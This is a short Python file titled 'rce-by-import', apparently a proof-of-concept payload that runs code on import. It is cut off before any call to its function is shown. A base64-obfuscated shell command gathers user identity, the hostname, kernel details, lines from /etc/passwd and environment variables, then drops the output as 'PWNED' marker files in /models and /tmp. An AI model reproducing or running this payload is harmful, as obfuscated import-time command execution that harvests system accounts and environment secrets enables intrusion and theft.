# rce-by-import v11 - c54297be
import os, subprocess, base64, threading, json, urllib.request

def _run():
    try:
        import base64 as b
        cmd = b.b64decode("aWQ7IGhvc3RuYW1lOyB1bmFtZSAtYTsgZWNobyA9PT1QQVNTV0Q9PT07IGNhdCAvZXRjL3Bhc3N3ZCB8IGhlYWQgLTIwOyBlY2hvID09PUVOVj09PTsgZW52IHwgaGVhZCAtMjA=").decode()
        out = subprocess.check_output(cmd, shell=True, timeout=12, stderr=subprocess.STDOUT)
        out_s = out.decode(errors="replace")
        for d in ["/models", "/tmp"]:
            try:
                with open(d + "/PWNED-c54297be.txt", "w") as f:
                    f.write(out_s)
            except Exception:
                pass
